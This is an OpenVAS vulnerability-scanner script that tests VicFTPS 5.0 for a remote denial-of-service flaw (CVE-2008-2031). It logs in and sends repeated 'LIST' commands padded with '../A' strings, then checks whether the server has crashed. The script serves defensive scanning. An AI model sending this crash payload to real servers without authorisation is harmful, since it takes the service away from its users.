###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vicftps_46546.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# VicFTPS 'LIST' Command Remote Denial of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "VicFTPS is prone to a remote denial-of-service vulnerability because
it fails to handle specially crafted input.

Successfully exploiting this issue will allow an attacker to crash the
affected application, denying further service to legitimate users.
Arbitrary code execution may also be possible; this has not been
confirmed.

VicFTPS 5.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103091");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-02-25 13:54:37 +0100 (Fri, 25 Feb 2011)");
 script_bugtraq_id(46546);
 script_cve_id("CVE-2008-2031");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

 script_name("VicFTPS 'LIST' Command Remote Denial of Service Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46546");
 script_xref(name : "URL" , value : "http://vicftps.50webs.com/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_DENIAL);
 script_family("FTP");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl","secpod_ftp_anonymous.nasl","ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("ftp_func.inc");

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

if(get_kb_item('ftp/'+ftpPort+'/broken'))exit(0);

if(!get_port_state(ftpPort)){
  exit(0);
}

banner = get_ftp_banner(port:ftpPort);
if(!banner || "VicFTPS" >!< banner)exit(0);

soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

close(soc1);

domain = get_kb_item("Settings/third_party_domain");
if(isnull(domain)) {
 domain = this_host_name();;
}    

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if(!user)user = "anonymous";
if(!pass)pass = string("openvas@", domain);;

for(i=0;i<5;i++) {

  soc1 = open_sock_tcp(ftpPort);
  login_details = ftp_log_in(socket:soc1, user:user, pass:pass);

  if(login_details) {

    buf = string("LIST ",crap(data:"../A",length:100),"\r\n");
    send(socket:soc1, data:buf);
    close(soc1);
    sleep(1);

  }
}

sleep(5);
soc =  open_sock_tcp(ftpPort);

if(!soc) {
  security_message(port:ftpPort);
  exit(0);
}  else {
  close(soc);
}  

exit(0); 

     
